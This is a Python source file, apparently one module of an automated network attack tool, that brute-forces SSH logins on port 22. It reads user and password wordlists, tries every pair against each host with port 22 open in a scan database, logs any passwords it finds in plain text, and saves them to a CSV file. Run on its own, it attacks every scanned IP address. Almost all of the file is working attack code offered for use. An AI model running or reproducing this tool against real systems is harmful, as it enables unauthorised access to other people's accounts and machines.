"""
ssh_connector.py - This script performs a brute force attack on SSH services (port 22) to find accessible accounts using various user credentials. It logs the results of successful connections.
"""

import os
import time
import pandas as pd
import paramiko
import socket
import logging
from rich.console import Console
from rich.progress import Progress, BarColumn, TextColumn, SpinnerColumn
from shared import SharedData
from logger import Logger
from actions.connector_utils import CredentialChecker

# Configure the logger
logger = Logger(name="ssh_connector.py", level=logging.DEBUG)

# Define the necessary global variables
b_class = "SSHBruteforce"
b_module = "ssh_connector"
b_status = "brute_force_ssh"
b_port = 22
b_parent = None

class SSHBruteforce:
    """
    Class to handle the SSH brute force process.
    """
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.ssh_connector = SSHConnector(shared_data)
        logger.info("SSHConnector initialized.")

    def bruteforce_ssh(self, ip, port):
        """
        Run the SSH brute force attack on the given IP and port.
        """
        logger.info(f"Running bruteforce_ssh on {ip}:{port}...")
        return self.ssh_connector.run_bruteforce(ip, port)
    
    def execute(self, ip, port, row, status_key):
        """
        Execute the brute force attack and update status.
        Optimization: Skip bruteforce if valid credentials already exist for this host.
        """
        logger.info(f"Executing SSHBruteforce on {ip}:{port}...")
        
        # Check if we already have valid credentials for this host
        existing_creds = CredentialChecker.check_existing_credentials(
            self.shared_data.sshfile, ip
        )
        if existing_creds:
            logger.info(f"SSH credentials already exist for {ip} - verifying instead of bruteforcing...")
            # Verify credentials still work
            if self._verify_credentials(ip, existing_creds):
                logger.success(f"Existing SSH credentials verified for {ip}: {len(existing_creds)} account(s)")
                return 'success'
            else:
                logger.warning(f"Existing credentials for {ip} no longer valid, will re-bruteforce")
        
        self.shared_data.ragnarorch_status = "SSHBruteforce"
        success, results = self.bruteforce_ssh(ip, port)
        if success and results:
            for mac_address, ip_addr, hostname, user, password, used_port in results:
                logger.success(
                    f"SSH credentials confirmed | MAC: {mac_address} | IP: {ip_addr} | Host: {hostname} | User: {user} | Password: {password} | Port: {used_port}"
                )
        else:
            logger.info(f"SSHBruteforce completed for {ip}:{port} with no valid credentials discovered")
        return 'success' if success else 'failed'
    
    def _verify_credentials(self, ip, credentials):
        """Verify that existing credentials still work (quick check)."""
        for user, password in credentials:
            if self.ssh_connector.ssh_connect(ip, user, password):
                logger.debug(f"Verified credential for {ip}: {user}")
                return True
        return False

class SSHConnector:
    """
    Class to manage the connection attempts and store the results.
    """
    def __init__(self, shared_data):
        self.shared_data = shared_data
        
        # Read from SQLite via shared_data (no more CSV)
        try:
            data = shared_data.read_data()
            self.scan = pd.DataFrame(data)
            if "Ports" not in self.scan.columns:
                self.scan["Ports"] = None
            # Ensure Ports column is string type before using .str accessor
            self.scan["Ports"] = self.scan["Ports"].astype(str)
            self.scan = self.scan[self.scan["Ports"].str.contains("22", na=False)]
        except Exception as e:
            logger.warning(f"Could not read data from database: {e}")
            self.scan = pd.DataFrame(columns=['MAC Address', 'IPs', 'Hostnames', 'Ports', 'Alive'])

        self.users = open(shared_data.usersfile, "r").read().splitlines()
        self.passwords = open(shared_data.passwordsfile, "r").read().splitlines()

        self.sshfile = shared_data.sshfile
        if not os.path.exists(self.sshfile):
            logger.info(f"File {self.sshfile} does not exist. Creating...")
            with open(self.sshfile, "w") as f:
                f.write("MAC Address,IP Address,Hostname,User,Password,Port\n")
        self.results = []  # Successful credentials for the current bruteforce run
        self._pending_results = []  # Entries waiting to be flushed to disk
        self.console = Console()

    def load_scan_file(self):
        """
        Load from SQLite database and filter for SSH ports.
        """
        data = self.shared_data.read_data()
        self.scan = pd.DataFrame(data)
        if "Ports" not in self.scan.columns:
            self.scan["Ports"] = None
        # Ensure Ports column is string type before using .str accessor
        self.scan["Ports"] = self.scan["Ports"].astype(str)
        self.scan = self.scan[self.scan["Ports"].str.contains("22", na=False)]

    def ssh_connect(self, adresse_ip, user, password):
        """Attempt to connect to SSH using only the supplied credentials.
        Retries up to 3 times on banner/connection errors with backoff."""
        max_retries = 3
        for attempt in range(max_retries):
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                ssh.connect(
                    adresse_ip,
                    username=user,
                    password=password,
                    port=22,
                    timeout=15,
                    auth_timeout=15,
                    banner_timeout=15,
                    look_for_keys=False,
                    allow_agent=False
                )
                logger.debug(f"SSH login succeeded for {adresse_ip} using {user}:{password}")
                return True
            except paramiko.AuthenticationException:
                logger.debug(f"SSH authentication failed for {adresse_ip} | user={user}")
                return False
            except (socket.error, paramiko.SSHException, EOFError) as exc:
                if attempt < max_retries - 1:
                    delay = 2 + attempt * 2  # 2s, 4s backoff
                    logger.debug(f"SSH banner/connection error to {adresse_ip} (attempt {attempt+1}/{max_retries}), retrying in {delay}s: {exc}")
                    time.sleep(delay)
                else:
                    logger.warning(f"SSH connection error to {adresse_ip} after {max_retries} attempts: {exc}")
                    return False
            finally:
                ssh.close()

    @staticmethod
    def _get_local_ips():
        """Get all IP addresses belonging to this machine."""
        local_ips = {'127.0.0.1', '::1'}
        try:
            hostname = socket.gethostname()
            for info in socket.getaddrinfo(hostname, None):
                local_ips.add(info[4][0])
        except socket.gaierror:
            pass
        # Also try the common netifaces approach via ip command
        try:
            import subprocess
            result = subprocess.run(
                ['hostname', '-I'], capture_output=True, text=True, timeout=5
            )
            if result.returncode == 0:
                local_ips.update(result.stdout.strip().split())
        except Exception:
            pass
        return local_ips

    def run_bruteforce(self, adresse_ip, port):
        # Skip brute-forcing our own machine
        if adresse_ip in self._get_local_ips():
            logger.info(f"Skipping SSH bruteforce on {adresse_ip} (this is our own machine)")
            return False, []

        self.load_scan_file()  # Reload the scan file to get the latest IPs and ports

        # Reset trackers for a fresh run on this host
        self.results = []
        self._pending_results = []

        ip_rows = self.scan[self.scan['IPs'] == adresse_ip]
        if ip_rows.empty:
            logger.warning(f"IP {adresse_ip} not present in scan cache; skipping SSH bruteforce")
            return False, []

        mac_address = ip_rows['MAC Address'].values[0]
        hostname = ip_rows['Hostnames'].values[0]

        # Build credential list
        cred_list = [(user, password) for user in self.users for password in self.passwords]
        total_tasks = len(cred_list)
        success = False

        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%")) as progress:
            task_id = progress.add_task("[cyan]Bruteforcing SSH...", total=total_tasks)

            for i, (user, password) in enumerate(cred_list):
                if self.shared_data.orchestrator_should_exit:
                    logger.info("Orchestrator exit signal received, stopping bruteforce.")
                    break

                # Cooldown between attempts to avoid overwhelming SSH daemon
                if i > 0:
                    time.sleep(1)

                if self.ssh_connect(adresse_ip, user, password):
                    entry = [mac_address, adresse_ip, hostname, user, password, port]
                    self.results.append(entry)
                    self._pending_results.append(entry)
                    logger.success(
                        f"Found SSH credentials -> IP: {adresse_ip} | User: {user} | Password: {password}"
                    )
                    self.save_results()
                    success = True
                    progress.update(task_id, completed=total_tasks)
                    break

                progress.update(task_id, advance=1)

        # Final flush/dedup after completion
        self.save_results()
        self.removeduplicates()

        return success, list(self.results)

    def save_results(self):
        """Persist pending successful connection attempts to disk."""
        if not self._pending_results:
            return

        df = pd.DataFrame(
            self._pending_results,
            columns=['MAC Address', 'IP Address', 'Hostname', 'User', 'Password', 'Port']
        )
        file_exists = os.path.exists(self.sshfile)
        df.to_csv(self.sshfile, index=False, mode='a', header=not file_exists)
        self._pending_results.clear()

    def removeduplicates(self):
        """
        Remove duplicate entries from the results CSV file.
        """
        if not os.path.exists(self.sshfile):
            return

        df = pd.read_csv(self.sshfile)
        df.drop_duplicates(inplace=True)
        df.to_csv(self.sshfile, index=False)

if __name__ == "__main__":
    shared_data = SharedData()
    try:
        ssh_bruteforce = SSHBruteforce(shared_data)
        logger.info("Démarrage de l'attaque SSH... sur le port 22")
        
        # Load the netkb file and get the IPs to scan
        ips_to_scan = shared_data.read_data()
        
        # Execute the brute force on each IP
        for row in ips_to_scan:
            ip = row["IPs"]
            logger.info(f"Executing SSHBruteforce on {ip}...")
            ssh_bruteforce.execute(ip, b_port, row, b_status)
        
        logger.info(f"Nombre total de succès: {len(ssh_bruteforce.ssh_connector.results)}")
        exit(len(ssh_bruteforce.ssh_connector.results))
    except Exception as e:
        logger.error(f"Erreur: {e}")
